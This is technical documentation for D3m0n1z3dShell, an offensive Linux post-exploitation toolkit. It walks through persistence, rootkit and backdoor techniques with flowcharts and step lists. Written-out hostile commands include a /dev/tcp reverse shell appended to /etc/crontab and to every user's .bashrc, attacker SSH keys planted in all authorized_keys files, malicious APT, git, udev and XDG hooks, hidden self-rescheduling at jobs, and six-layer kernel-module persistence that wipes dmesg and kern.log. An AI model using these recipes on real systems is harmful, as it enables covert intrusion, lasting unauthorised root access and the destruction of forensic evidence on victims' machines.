# D3m0n1z3dShell — Technical Documentation

> Complete technical documentation for all 102 techniques with detailed flowcharts showing every syscall, file write, and decision branch.

---

## Table of Contents

- [Architecture Overview](#architecture-overview)
- [MITRE ATT\&CK Kill Chain](#mitre-attck-kill-chain)
- **Linux Techniques**
  - [1. Persistence](#1-persistence)
    - [01 — SSH Keypair Generation](#01--ssh-keypair-generation)
    - [02 — APT Persistence](#02--apt-persistence)
    - [03 — Crontab Persistence](#03--crontab-persistence)
    - [04 — Systemd User Level](#04--systemd-user-level)
    - [05 — Systemd Root Level](#05--systemd-root-level)
    - [06 — Bashrc Persistence](#06--bashrc-persistence)
    - [13 — Init.d Persistence](#13--initd-persistence)
    - [14 — rc.local Persistence](#14--rclocal-persistence)
    - [15 — MOTD Persistence](#15--motd-persistence)
    - [19 — Udev Persistence](#19--udev-persistence)
    - [20 — LKM Rootkit Persistence After Reboot](#20--lkm-rootkit-persistence-after-reboot)
    - [22 — SSH Authorized Keys Backdoor](#22--ssh-authorized-keys-backdoor)
    - [23 — Logrotate Persistence](#23--logrotate-persistence)
    - [24 — Git Hooks Persistence](#24--git-hooks-persistence)
    - [25 — XDG Autostart Persistence](#25--xdg-autostart-persistence)
    - [26 — At Job Persistence](#26--at-job-persistence)
    - [27 — DKMS Integration for LKM Rootkit](#27--dkms-integration-for-lkm-rootkit)
    - [30 — Initramfs Injection (Ultra-Persistent)](#30--initramfs-injection-ultra-persistent)
    - [36 — Trap Command Persistence](#36--trap-command-persistence)
    - [37 — Python Startup Hooks](#37--python-startup-hooks)
    - [41 — Systemd Timer Persistence](#41--systemd-timer-persistence)
    - [46 — Bootkit / Bootloader Persistence](#46--bootkit--bootloader-persistence)
    - [56 — D-Bus Service Persistence](#56--d-bus-service-persistence)
    - [60 — Kernel Parameter Abuse](#60--kernel-parameter-abuse)
  - [2. Privilege Escalation](#2-privilege-escalation)
    - [07 — Privileged User \& SUID Bash](#07--privileged-user--suid-bash)
    - [11 — LD\_PRELOAD PrivEsc](#11--ld_preload-privesc)
    - [51 — Linux Capabilities Abuse](#51--linux-capabilities-abuse)
    - [52 — PATH Variable Hijacking](#52--path-variable-hijacking)
    - [58 — Library RPATH/ldconfig Poisoning](#58--library-rpathldconfig-poisoning)
  - [3. Defense Evasion](#3-defense-evasion)
    - [12 — Anti-Reversing Technique](#12--anti-reversing-technique)
    - [28 — Process Hiding via Bind Mount](#28--process-hiding-via-bind-mount)
    - [29 — Hidepid /proc Mount](#29--hidepid-proc-mount)
    - [32 — Depmod Stealth](#32--depmod-stealth)
    - [39 — Binary Trojanization](#39--binary-trojanization)
    - [40 — System-Wide ld.so.preload](#40--system-wide-ldsopreload)
    - [42 — Impair Defenses](#42--impair-defenses)
    - [43 — Anti-Forensics / Indicator Removal](#43--anti-forensics--indicator-removal)
    - [44 — Rogue Certificate Authority](#44--rogue-certificate-authority)
    - [54 — VM / Sandbox Evasion](#54--vm--sandbox-evasion)
  - [4. Credential Access](#4-credential-access)
    - [21 — PAM Backdoor](#21--pam-backdoor)
    - [47 — Credential Harvester](#47--credential-harvester)
    - [48 — Linux Keylogger](#48--linux-keylogger)
    - [57 — NSS Module Backdoor](#57--nss-module-backdoor)
  - [5. Execution](#5-execution)
    - [09 — ICMP Backdoor](#09--icmp-backdoor)
    - [17 — Reverse Shell with Custom Process Name](#17--reverse-shell-with-custom-process-name)
    - [18 — Process Injection](#18--process-injection)
    - [53 — Fileless / Memfd Execution](#53--fileless--memfd-execution)
  - [6. Rootkits](#6-rootkits)
    - [08 — LKM Rootkit Modified](#08--lkm-rootkit-modified)
    - [10 — LKM Rootkit (Locutus)](#10--lkm-rootkit-locutus)
    - [31 — Package Manager Backdoor (.deb)](#31--package-manager-backdoor-deb)
    - [33 — Namespace Jail](#33--namespace-jail)
  - [7. Stealth \& Data Hiding](#7-stealth--data-hiding)
    - [45 — Hidden Encrypted Filesystem](#45--hidden-encrypted-filesystem)
    - [49 — Web Shell Deployment](#49--web-shell-deployment)
    - [55 — xattr Data Hiding](#55--xattr-data-hiding)
  - [8. Lateral Movement \& C2](#8-lateral-movement--c2)
    - [16 — ACL Persistence](#16--acl-persistence)
    - [34 — SSH Tunnel Hijack](#34--ssh-tunnel-hijack)
    - [35 — SSH-IT: PTY MITM](#35--ssh-it-pty-mitm)
    - [38 — Port Knocking / Socket Filter](#38--port-knocking--socket-filter)
    - [50 — Phantom User Creation](#50--phantom-user-creation)
    - [59 — DNS Tunneling C2](#59--dns-tunneling-c2)
  - [Advanced Techniques (from Research)](#advanced-techniques-from-research)
    - [65 — Diamorphine Rootkit Auto-Deploy](#65--diamorphine-rootkit-auto-deploy)
    - [66 — Systemd Generator Persistence](#66--systemd-generator-persistence)
    - [67 — NetworkManager Dispatcher Persistence](#67--networkmanager-dispatcher-persistence)
    - [68 — Polkit Privilege Escalation Backdoor](#68--polkit-privilege-escalation-backdoor)
    - [69 — Sudoers Backdoor](#69--sudoers-backdoor)
    - [70 — eBPF-Based Process/File Hiding](#70--ebpf-based-processfile-hiding)
    - [71 — Modprobe.d Event Hijacking](#71--modprobed-event-hijacking)
    - [72 — GRUB Bootloader Backdoor](#72--grub-bootloader-backdoor)
    - [73 — Mount Namespace Stashspace](#73--mount-namespace-stashspace)
- **Metasploit-Sourced Techniques**
    - [74 — SystemD Drop-in Override](#74--systemd-drop-in-override)
    - [75 — Yum/DNF Plugin Backdoor](#75--yumdnf-plugin-backdoor)
    - [76 — Docker Container Persistence](#76--docker-container-persistence)
    - [77 — OpenRC Service Persistence](#77--openrc-service-persistence)
    - [78 — Upstart Service Persistence](#78--upstart-service-persistence)
    - [79 — Emacs Extension Persistence](#79--emacs-extension-persistence)
    - [80 — IGEL OS Persistence](#80--igel-os-persistence)
    - [81 — WSL Startup Folder Persistence](#81--wsl-startup-folder-persistence)
    - [82 — Periodic/Anacron Persistence](#82--periodicanacron-persistence)
- **Windows Techniques**
  - [9. Windows Persistence Generator](#9-windows-persistence-generator)
  - [10. Windows Defense Evasion Generator](#10-windows-defense-evasion-generator)
  - [11. Windows Credential Access Generator](#11-windows-credential-access-generator)
  - [12. Windows Stealth \& Indicator Removal](#12-windows-stealth--indicator-removal)
- [Build System](#build-system)

---

## Architecture Overview

```mermaid
flowchart TD
    A["./demonizedshell.sh"] --> B["main()"]
    B --> C{"EUID == 0?"}
    C -->|No| C1["Exit: root required"]
    C -->|Yes| D["requirements()<br>apt install lolcat git make gcc"]
    D --> E["banner()"]
    E --> F["menu()"]
    F --> G["read MENUINPUT"]
    G --> H{"Route by number [01]-[64]"}

    H -->|01-07| I["Inline functions<br>sshGen, apthooking, crontab,<br>bashRCPersistence, systemdUser,<br>systemdRoot, userANDBashSUID"]
    H -->|08-60| J["chmod +x scripts/X.sh<br>cd scripts && ./X.sh"]
    H -->|61-64| K["chmod +x scripts/win_X.sh<br>cd scripts && ./win_X.sh"]

    J --> L["External script executes<br>with own banner/menu/logic"]
    K --> M["PowerShell .ps1 generator<br>saves to payloads/"]
    M --> N["_winrm_deliver()<br>5 delivery methods"]

    style A fill:#ff4444,color:#fff
    style F fill:#4444ff,color:#fff
    style I fill:#44aa44,color:#fff
    style L fill:#44aa44,color:#fff
    style M fill:#aa44aa,color:#fff
```

```mermaid
flowchart LR
    subgraph "Project Structure"
        DS["demonizedshell.sh<br>(64 menu entries)"]
        ST["static/<br>demonizedshell_static.sh<br>(57 entries, self-contained)"]
        SC["scripts/<br>48 .sh files"]
        SB["static-binaries/<br>pspy, mimipenguin,<br>linpeas, chisel, etc."]
        LO["locutus/<br>LKM rootkit source<br>locutus.c, borg_transwarp.c"]
        PI["procinject/<br>ptrace injection tools"]
        PY["payloads/<br>generated .ps1 files"]
        BU["build.sh<br>Binary build system"]
    end

    DS -->|dispatches to| SC
    DS -->|generates| PY
    SC -->|uses| SB
    SC -->|compiles| LO
    SC -->|uses| PI
    BU -->|embeds| ST
    BU -->|produces| BD["build/<br>d3m0nized (ELF)<br>d3m0nized-sfx<br>d3m0nized-shc"]

    style DS fill:#ff4444,color:#fff
    style BU fill:#4488ff,color:#fff
```

---

## MITRE ATT&CK Kill Chain

```mermaid
flowchart LR
    subgraph EX["Execution"]
        E1["[09] ICMP Backdoor<br>T1095"]
        E2["[17] Custom Process Shell<br>T1036.004"]
        E3["[18] Process Injection<br>T1055.008"]
        E4["[53] Memfd Fileless<br>T1027.011"]
    end

    subgraph PE["Persistence"]
        P1["[02] APT Hook<br>[03] Crontab<br>[06] Bashrc"]
        P2["[04][05] Systemd<br>[13] Init.d<br>[14] rc.local"]
        P3["[15] MOTD<br>[19] Udev<br>[22] SSH Keys"]
        P4["[23] Logrotate<br>[24] Git Hooks<br>[25] XDG"]
        P5["[26] At Job<br>[36] Trap<br>[37] Python"]
        P6["[41] Systemd Timer<br>[46] Bootkit<br>[56] D-Bus"]
        P7["[20] LKM Persist<br>[27] DKMS<br>[60] Kernel Param"]
    end

    subgraph PR["Privilege Escalation"]
        X1["[07] SUID bash<br>T1548.001"]
        X2["[11] LD_PRELOAD<br>T1574.006"]
        X3["[51] Capabilities<br>T1548"]
        X4["[52] PATH Hijack<br>T1574.007"]
        X5["[58] ldconfig Poison<br>T1574.008"]
    end

    subgraph DE["Defense Evasion"]
        D1["[12] Anti-Reversing<br>[28] Bind Mount"]
        D2["[29] Hidepid<br>[32] Depmod Stealth"]
        D3["[39] Binary Trojan<br>[40] ld.so.preload"]
        D4["[42] Impair Defenses<br>[43] Anti-Forensics"]
        D5["[44] Rogue CA<br>[54] VM Evasion"]
    end

    subgraph CA["Credential Access"]
        C1["[21] PAM Backdoor<br>T1556.003"]
        C2["[47] Cred Harvest<br>T1552"]
        C3["[48] Keylogger<br>T1056.001"]
        C4["[57] NSS Backdoor<br>T1556"]
    end

    subgraph LM["Lateral Movement & C2"]
        L1["[34] SSH Tunnel Hijack<br>T1563.001"]
        L2["[35] SSH-IT MITM<br>T1557"]
        L3["[38] Port Knocking<br>T1205.002"]
        L4["[59] DNS Tunnel C2<br>T1071.004"]
    end

    subgraph RK["Rootkits"]
        R1["[08] Diamorphine Mod<br>[10] Locutus LKM"]
        R2["[30] Initramfs Inject<br>[31] .deb Backdoor"]
        R3["[33] Namespace Jail<br>T1610"]
    end

    subgraph WI["Windows"]
        W1["[61] 8× Persistence"]
        W2["[62] 7× Evasion"]
        W3["[63] 5× Credential"]
        W4["[64] 4× Stealth"]
    end

    EX --> PE --> PR --> DE --> CA --> LM
    PE --> RK
    DE --> WI
```

---

## 1. Persistence

### 01 — SSH Keypair Generation

**Script:** `demonizedshell.sh` inline `sshGen()` | **MITRE:** —  
**Purpose:** Generate RSA SSH keypairs for all users with valid shells, enabling passwordless SSH access.

```mermaid
flowchart TD
    A["sshGen()"] --> B["Read /etc/passwd<br>IFS=':' parse fields"]
    B --> C{"For each user entry"}
    C --> D{"shell =~ /bin/*<br>AND home =~ /home/*?"}
    D -->|No| C
    D -->|Yes| E{"~/.ssh/id_rsa.pub<br>exists?"}
    E -->|Yes| F["Skip: key already exists"]
    E -->|No| G["mkdir -p ~/.ssh"]
    G --> H["ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa"]
    H --> I["chmod 700 ~/.ssh<br>chmod 600 ~/.ssh/id_rsa"]
    I --> J["chown -R user:user ~/.ssh"]
    J --> C
    F --> C
    C -->|Done| K["Success: keys generated for all valid users"]

    style A fill:#ff4444,color:#fff
    style H fill:#ff8800,color:#fff
    style K fill:#44aa44,color:#fff
```

**Flow Details:**
1. Parse `/etc/passwd` line by line using `:` as IFS delimiter
2. Filter users with shell matching `/bin/*` and home directory matching `/home/*`
3. Skip users that already have `~/.ssh/id_rsa.pub`
4. Generate RSA keypair with empty passphrase via `ssh-keygen`
5. Set secure permissions (700 on `.ssh`, 600 on private key)
6. Fix ownership with `chown -R`

---

### 02 — APT Persistence

**Script:** `demonizedshell.sh` inline `apthooking()` | **MITRE:** T1546  
**Purpose:** Hook `apt-get update` via APT Pre-Invoke to execute arbitrary commands whenever the package manager runs.

```mermaid
flowchart TD
    A["apthooking()"] --> B["Prompt: enter payload/command"]
    B --> C["read command"]
    C --> D["touch /etc/apt/apt.conf.d/1aptget"]
    D --> E["Write APT::Update::Pre-Invoke<br>{command}; to file"]
    E --> F["Persistence active:<br>triggers on every apt-get update"]

    style A fill:#ff4444,color:#fff
    style D fill:#ff8800,color:#fff
    style E fill:#ff8800,color:#fff
    style F fill:#44aa44,color:#fff
```

**Flow Details:**
1. User provides a payload command
2. Creates `/etc/apt/apt.conf.d/1aptget` — APT config files in this directory are auto-loaded
3. Writes `APT::Update::Pre-Invoke {"<command>"};` directive
4. APT executes the Pre-Invoke command before every `apt-get update` operation
5. Runs as root (since apt-get update requires root)

---

### 03 — Crontab Persistence

**Script:** `demonizedshell.sh` inline `crontab()` | **MITRE:** T1053.003  
**Purpose:** Add persistent cron job executing every minute as root.

```mermaid
flowchart TD
    A["crontab()"] --> B{"Custom command?"}
    B -->|Yes| C["read custom command"]
    B -->|No| D["read IP + port"]
    D --> E["Build reverse shell:<br>/bin/bash -c 'bash -i #gt;#amp; /dev/tcp/IP/PORT 0#gt;#amp;1'"]
    C --> F["Append to /etc/crontab:<br>* * * * * root COMMAND"]
    E --> F
    F --> G["tee -a /etc/crontab > /dev/null"]
    G --> H["Runs every minute as root"]

    style A fill:#ff4444,color:#fff
    style F fill:#ff8800,color:#fff
    style G fill:#ff8800,color:#fff
    style H fill:#44aa44,color:#fff
```

**Flow Details:**
1. Option A: User provides custom command. Option B: Builds `/dev/tcp` reverse shell from IP:PORT
2. Appends `* * * * * root <command>` to `/etc/crontab` (system-wide crontab)
3. Uses `tee -a` with redirect to `/dev/null` (suppresses output, requires root)
4. Cron daemon picks up changes immediately — no `crontab -e` needed
5. Executes every minute (`* * * * *`) as root user

---

### 04 — Systemd User Level

**Script:** `demonizedshell.sh` inline `systemdUser()` | **MITRE:** T1543.002  
**Purpose:** Create a persistent systemd user service that restarts on failure.

```mermaid
flowchart TD
    A["systemdUser()"] --> B{"Run a script?<br>(Y/n)"}
    B -->|Y| C["read script_path"]
    B -->|n| D["read exec_command"]
    C --> E["Write ~/.config/systemd/user/hidden.service"]
    D --> E
    E --> F["[Unit]<br>Description=My service<br>[Service]<br>ExecStart={script_path or exec_command}<br>Restart=always<br>RestartSec=60<br>[Install]<br>WantedBy=default.target"]
    F --> G{"Script mode AND<br>not executable?"}
    G -->|Yes| H["Error: no execute permission"]
    G -->|No| I["systemctl --user daemon-reload"]
    I --> J["systemctl --user enable hidden.service"]
    J --> K["systemctl --user start hidden.service"]
    K --> L["Persistence active at user level"]

    style A fill:#ff4444,color:#fff
    style E fill:#ff8800,color:#fff
    style K fill:#44aa44,color:#fff
```

**Flow Details:**
1. Choose between script path or direct command for `ExecStart`
2. Writes unit file to `~/.config/systemd/user/hidden.service`
3. Unit configured with `Restart=always` and 60-second restart interval
4. `daemon-reload` → `enable` → `start` sequence activates the service
5. Persists across user logins (user-level systemd, no root needed for this scope)

---

### 05 — Systemd Root Level

**Script:** `demonizedshell.sh` inline `systemdRoot()` | **MITRE:** T1543.002  
**Purpose:** Create a persistent systemd system service running as root.

```mermaid
flowchart TD
    A["systemdRoot()"] --> B{"Run a script? (Y/n)"}
    B -->|Y| C["read script_path"]
    B -->|n| D["read exec_command"]
    C --> E["Write /etc/systemd/system/hidden2.service"]
    D --> E
    E --> F["[Unit] Description=My service<br>[Service] ExecStart={path/cmd}<br>Restart=always, RestartSec=60<br>[Install] WantedBy=default.target"]
    F --> G{"Script mode AND<br>not executable?"}
    G -->|Yes| H["Error: no execute permission"]
    G -->|No| I["systemctl daemon-reload"]
    I --> J["systemctl enable hidden2.service"]
    J --> K["systemctl start hidden2.service"]
    K --> L["Persistence active at system level"]

    style A fill:#ff4444,color:#fff
    style E fill:#ff8800,color:#fff
    style K fill:#44aa44,color:#fff
```

**Flow Details:**
1. Identical flow to User Level but writes to `/etc/systemd/system/` (root scope)
2. Service named `hidden2.service` with `Restart=always`
3. Runs as root, survives reboots via `WantedBy=default.target`
4. Uses system-level `systemctl` (no `--user` flag)

---

### 06 — Bashrc Persistence

**Script:** `demonizedshell.sh` inline `bashRCPersistence()` | **MITRE:** T1546.004  
**Purpose:** Inject reverse shell payload into all users' `.bashrc` files for execution on every interactive login.

```mermaid
flowchart TD
    A["bashRCPersistence()"] --> B["read IP address"]
    B --> C["read port"]
    C --> D["Build payload:<br>/bin/bash -c 'bash -i #gt;#amp; /dev/tcp/IP/PORT 0#gt;#amp;1'"]
    D --> E{"For each /home/* directory"}
    E --> F{"Is directory?"}
    F -->|No| E
    F -->|Yes| G["Append payload to<br>/home/user/.bashrc"]
    G --> E
    E -->|Done| H["Persistence active:<br>triggers on every interactive shell"]

    style A fill:#ff4444,color:#fff
    style G fill:#ff8800,color:#fff
    style H fill:#44aa44,color:#fff
```

**Flow Details:**
1. Builds a `/dev/tcp` reverse shell from user-provided IP:PORT
2. Iterates over all directories in `/home/`
3. Appends the raw payload string to each user's `.bashrc`
4. Fires every time any user opens an interactive bash shell
5. Does NOT modify root's `.bashrc` (only `/home/*`)

---

### 13 — Init.d Persistence

**Script:** `scripts/init.sh` | **MITRE:** T1037.004  
**Purpose:** Create a malicious init.d service script for SysV-style boot persistence.

```mermaid
flowchart TD
    A["init.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit: root required"]
    B -->|Yes| C["read filepath (payload/script path)"]
    C --> D["Write /etc/init.d/malinit"]
    D --> E["LSB headers:<br>Provides: malinit<br>Required-Start: $local_fs $network $syslog<br>Default-Start: 2 3 4 5"]
    E --> F["do_start():<br>start-stop-daemon --start<br>--pidfile /var/run/init-daemon.pid<br>--exec filepath"]
    F --> G["chmod +x /etc/init.d/malinit"]
    G --> H["update-rc.d malinit defaults"]
    H --> I["Service registered for<br>runlevels 2,3,4,5"]

    style A fill:#ff4444,color:#fff
    style D fill:#ff8800,color:#fff
    style H fill:#ff8800,color:#fff
    style I fill:#44aa44,color:#fff
```

---

### 14 — rc.local Persistence

**Script:** `scripts/rclocal.sh` | **MITRE:** T1037.004  
**Purpose:** Inject commands into `/etc/rc.local` for boot-time execution.

```mermaid
flowchart TD
    A["rclocal.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit: root required"]
    B -->|Yes| C["read reverse shell command"]
    C --> D["Write /etc/rc.local:<br>#!/bin/bash<br>REVSHELL"]
    D --> E["chmod +x /etc/rc.local"]
    E --> F["Executes on every boot<br>(before login prompt)"]

    style A fill:#ff4444,color:#fff
    style D fill:#ff8800,color:#fff
    style F fill:#44aa44,color:#fff
```

---

### 15 — MOTD Persistence

**Script:** `scripts/motd.sh` | **MITRE:** T1546.004  
**Purpose:** Inject payload into Message of the Day scripts, triggered on every SSH login.

```mermaid
flowchart TD
    A["motd.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit: root required"]
    B -->|Yes| C["read payload/script path"]
    C --> D["touch /etc/update-motd.d/50-pers"]
    D --> E["Write #!/bin/bash + payload"]
    E --> F["chmod +x /etc/update-motd.d/50-pers"]
    F --> G["Executes as root on<br>every SSH/console login"]

    style A fill:#ff4444,color:#fff
    style D fill:#ff8800,color:#fff
    style G fill:#44aa44,color:#fff
```

---

### 19 — Udev Persistence

**Script:** `scripts/udev.sh` | **MITRE:** T1546  
**Purpose:** Create udev rules that trigger payloads on hardware events (network, USB, block device, custom).

```mermaid
flowchart TD
    A["udev.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit: root required"]
    B -->|Yes| C["Select trigger type"]
    C --> D{"Choice"}
    D -->|1| E["Network: ACTION==add,<br>SUBSYSTEM==net,<br>KERNEL==eth*|en*|wl*"]
    D -->|2| F["USB: ACTION==add,<br>SUBSYSTEM==usb,<br>ENV{DEVTYPE}==usb_device"]
    D -->|3| G["Block: ACTION==add,<br>SUBSYSTEM==block,<br>KERNEL==sd[a-z]*"]
    D -->|4| H["Custom: user provides<br>match keys"]

    E --> I["read payload<br>(default: reverse shell)"]
    F --> I
    G --> I
    H --> I

    I --> J["read rule filename<br>(default: 75-persistence.rules)"]
    J --> K["Write /etc/udev/rules.d/FILENAME:<br>MATCH, RUN+=/bin/sh -c 'nohup PAYLOAD &'"]
    K --> L["chmod 644 rule file"]
    L --> M["udevadm control --reload-rules"]
    M --> N["Triggers on matching<br>hardware events"]

    style A fill:#ff4444,color:#fff
    style K fill:#ff8800,color:#fff
    style M fill:#ff8800,color:#fff
    style N fill:#44aa44,color:#fff
```

---

### 20 — LKM Rootkit Persistence After Reboot

**Script:** `scripts/lkm_persist.sh` | **MITRE:** T1547.006  
**Purpose:** Set up 6-layer persistence for a kernel module to survive reboots, kernel updates, and cleanup attempts.

```mermaid
flowchart TD
    A["lkm_persist.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit: root required"]
    B -->|Yes| C["read ko_path"]
    C --> D{"Module file exists?"}
    D -->|No| Z2["Exit: not found"]
    D -->|Yes| E["Extract modname, KVER"]

    E --> L1["Layer 1: cp .ko to<br>/lib/modules/KVER/kernel/lib/<br>depmod -a"]
    L1 --> L2["Layer 2: Append modname<br>to /etc/modules"]
    L2 --> L3["Layer 3: Create<br>/etc/modules-load.d/modname.conf"]
    L3 --> L4["Layer 4: /etc/modprobe.d/modname.conf<br>softdep nf_conntrack pre: modname"]
    L4 --> L5["Layer 5: /etc/kernel/postinst.d/zz-modname<br>Copies .ko to new kernel dir on update"]
    L5 --> L6["Layer 6: systemd service<br>/etc/systemd/system/modname-load.service<br>Type=oneshot, ExecStart=/sbin/insmod"]
    L6 --> F["systemctl daemon-reload<br>systemctl enable service"]
    F --> G{"Module loaded?"}
    G -->|No| H["insmod ko_path<br>fallback: modprobe modname"]
    G -->|Yes| I["Skip load"]
    H --> J["dmesg -C<br>clear kern.log"]
    I --> J
    J --> K["6-layer persistence active"]

    style A fill:#ff4444,color:#fff
    style L1 fill:#ff8800,color:#fff
    style L2 fill:#ff8800,color:#fff
    style L3 fill:#ff8800,color:#fff
    style L4 fill:#ff8800,color:#fff
    style L5 fill:#ff8800,color:#fff
    style L6 fill:#ff8800,color:#fff
    style K fill:#44aa44,color:#fff
```

**Flow Details:**
1. **Layer 1** — Copy `.ko` to kernel module tree + `depmod -a` registers it
2. **Layer 2** — `/etc/modules` (Debian legacy boot loader)
3. **Layer 3** — `/etc/modules-load.d/` (systemd native module loader)
4. **Layer 4** — `modprobe.d` softdep — piggybacks on `nf_conntrack` (loaded during network init)
5. **Layer 5** — `postinst.d` hook copies `.ko` to new kernel directories on kernel updates
6. **Layer 6** — systemd service as final fallback with `insmod`
7. Clears `dmesg` and `kern.log` to remove traces

---

### 22 — SSH Authorized Keys Backdoor

**Script:** `scripts/ssh_authkeys.sh` | **MITRE:** T1098.004  
**Purpose:** Plant attacker's SSH public key into all users' `authorized_keys` files.

```mermaid
flowchart TD
    A["ssh_authkeys.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["read SSH public key"]
    C --> D{"Key empty?"}
    D -->|Yes| Z2["Exit: no key"]
    D -->|No| E["mkdir -p /root/.ssh<br>chmod 700"]
    E --> F{"Key already in<br>root authorized_keys?"}
    F -->|Yes| G["Skip root"]
    F -->|No| H["Append key to /root/.ssh/authorized_keys<br>chmod 600"]
    H --> I["count++"]
    G --> J{"For each user in /etc/passwd"}
    I --> J
    J --> K{"Valid shell AND /home/* AND dir exists?"}
    K -->|No| J
    K -->|Yes| L{"Key already present?"}
    L -->|Yes| M["Skip user"]
    L -->|No| N["mkdir -p ~/.ssh<br>Append key to authorized_keys<br>chmod 600<br>chown user:user"]
    N --> O["count++"]
    M --> J
    O --> J
    J -->|Done| P["Backdoor planted for count users"]

    style A fill:#ff4444,color:#fff
    style H fill:#ff8800,color:#fff
    style N fill:#ff8800,color:#fff
    style P fill:#44aa44,color:#fff
```

---

### 23 — Logrotate Persistence

**Script:** `scripts/logrotate.sh` | **MITRE:** T1053.003  
**Purpose:** Abuse logrotate's `postrotate` script to execute payloads during daily log rotation.

```mermaid
flowchart TD
    A["logrotate.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["read payload<br>(default: reverse shell)"]
    C --> D["read config filename<br>(default: dpkg-log)"]
    D --> E["Write /etc/logrotate.d/CONFNAME:<br>/var/log/dpkg.log {<br>  daily, rotate 7, compress<br>  postrotate<br>    /bin/bash -c 'PAYLOAD' &<br>  endscript<br>}"]
    E --> F["chmod 644 config"]
    F --> G["Executes daily when<br>logrotate processes dpkg.log"]

    style A fill:#ff4444,color:#fff
    style E fill:#ff8800,color:#fff
    style G fill:#44aa44,color:#fff
```

---

### 24 — Git Hooks Persistence

**Script:** `scripts/githooks.sh` | **MITRE:** T1546  
**Purpose:** Inject malicious git hooks into all repositories found on the system.

```mermaid
flowchart TD
    A["githooks.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["read payload<br>(default: reverse shell)"]
    C --> D["Select hook type:<br>1. post-merge (git pull)<br>2. pre-commit<br>3. post-checkout"]
    D --> E["find /home/ /root/<br>-name .git -type d"]
    E --> F{"Repos found?"}
    F -->|No| G["Manual path input"]
    F -->|Yes| H{"For each .git dir"}
    G --> H
    H --> I{"Existing hook<br>without d3m0n marker?"}
    I -->|Yes| J["mv hook to hook.d3m0n_orig"]
    I -->|No| K["Skip backup"]
    J --> L["Write hook:<br>#!/bin/bash<br># d3m0n1z3d<br>nohup PAYLOAD &"]
    K --> L
    L --> M{"Original preserved?"}
    M -->|Yes| N["Append: bash original_hook $@"]
    M -->|No| O["Skip"]
    N --> P["chmod +x hook"]
    O --> P
    P --> H
    H -->|Done| Q["Hooks planted in count repos"]

    style A fill:#ff4444,color:#fff
    style L fill:#ff8800,color:#fff
    style Q fill:#44aa44,color:#fff
```

---

### 25 — XDG Autostart Persistence

**Script:** `scripts/xdg.sh` | **MITRE:** T1547.001  
**Purpose:** Create `.desktop` files in XDG autostart directory for execution on graphical login.

```mermaid
flowchart TD
    A["xdg.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["read payload (default: revshell)"]
    C --> D["read .desktop filename<br>(default: gnome-update-helper)"]
    D --> E["read display name<br>(default: GNOME Update Helper)"]
    E --> F["mkdir -p /etc/xdg/autostart/"]
    F --> G["Write .desktop file:<br>Type=Application<br>Name=Display Name<br>Exec=/bin/bash -c 'PAYLOAD' &<br>NoDisplay=true<br>X-GNOME-Autostart-enabled=true<br>X-GNOME-Autostart-Delay=10"]
    G --> H["chmod 644"]
    H --> I["Triggers on GNOME/KDE/XFCE login"]

    style A fill:#ff4444,color:#fff
    style G fill:#ff8800,color:#fff
    style I fill:#44aa44,color:#fff
```

---

### 26 — At Job Persistence

**Script:** `scripts/atjob.sh` | **MITRE:** T1053.002  
**Purpose:** Create self-rescheduling `at` jobs — invisible to `crontab -l`.

```mermaid
flowchart TD
    A["atjob.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C{"'at' command available?"}
    C -->|No| D["apt install at"]
    C -->|Yes| E["systemctl start/enable atd"]
    D --> E
    E --> F["read payload (default: revshell)"]
    F --> G["read interval (default: 5 min)"]
    G --> H["Write /var/tmp/.systemd-helper:<br>#!/bin/bash<br>PAYLOAD &<br>echo '/bin/bash HELPER' | at now + N min"]
    H --> I["chmod +x helper script"]
    I --> J["Schedule first run:<br>echo '/bin/bash HELPER' | at now + N min"]
    J --> K["Self-rescheduling loop:<br>each execution schedules next"]

    style A fill:#ff4444,color:#fff
    style H fill:#ff8800,color:#fff
    style K fill:#44aa44,color:#fff
```

**Flow Details:**
1. Ensures `at` is installed and `atd` daemon is running
2. Creates a hidden helper script at `/var/tmp/.systemd-helper`
3. Helper runs the payload then reschedules itself via `at now + N minutes`
4. Creates a self-perpetuating loop invisible to `crontab -l` (at jobs are separate)

---

### 27 — DKMS Integration for LKM Rootkit

**Script:** `scripts/dkms_rootkit.sh` | **MITRE:** T1547.006  
**Purpose:** Register rootkit as a DKMS module so it auto-recompiles on kernel updates.

```mermaid
flowchart TD
    A["dkms_rootkit.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C{"dkms installed?"}
    C -->|No| D["apt install dkms"]
    C -->|Yes| E["read .ko source directory"]
    D --> E
    E --> F["read module name + version"]
    F --> G["cp source to /usr/src/name-version/"]
    G --> H["Create dkms.conf:<br>PACKAGE_NAME, PACKAGE_VERSION,<br>BUILT_MODULE_NAME, DEST_MODULE_LOCATION,<br>AUTOINSTALL=yes"]
    H --> I["dkms add -m name -v version"]
    I --> J["dkms build -m name -v version"]
    J --> K["dkms install -m name -v version"]
    K --> L["Module auto-recompiles<br>on every kernel update"]

    style A fill:#ff4444,color:#fff
    style H fill:#ff8800,color:#fff
    style I fill:#ff8800,color:#fff
    style L fill:#44aa44,color:#fff
```

---

### 30 — Initramfs Injection (Ultra-Persistent)

**Script:** `scripts/initramfs_inject.sh` | **Menu:** [30] | **MITRE:** T1542.003  
**Purpose:** Inject a kernel module into initramfs — loads before root filesystem mounts, the earliest possible persistence.

```mermaid
flowchart TD
    A["initramfs_inject.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Find initramfs:<br>/boot/initrd.img-KVER<br>or /boot/initramfs-KVER.img"]
    C --> D["read ko_path (module to inject)"]
    D --> E["Backup: cp initrd to initrd.bak.TIMESTAMP"]
    E --> F["Extract initramfs:<br>unmkinitramfs (preferred)<br>or zcat | cpio -idm<br>or xzcat/lz4cat fallbacks"]
    F --> G["Inject: cp .ko to<br>ROOTFS/lib/modules/KVER/kernel/lib/"]
